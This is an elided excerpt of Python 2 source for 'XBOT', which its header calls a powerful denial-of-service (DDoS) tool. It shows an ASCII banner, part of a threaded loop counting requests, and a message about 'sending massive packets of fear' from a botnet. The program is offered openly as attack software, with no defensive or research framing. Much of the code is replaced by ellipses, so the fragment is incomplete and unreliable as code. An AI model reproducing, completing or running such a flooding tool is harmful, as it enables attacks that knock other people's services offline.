# ----------------------------------------------------------------------------------------------
# XBOT - Smokeless iDDOS Tool
#
# The XBOT is one of the Most Powerful iDDOS Tool
...
print \
"""
 ooo      ooo   888888     o888888o  8888888888     
	...
	def run(self):
		...
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				previous=request_counter
		if flag==2:
			print "\n-- Sending massive packets of fear by XBOT Botnet --"
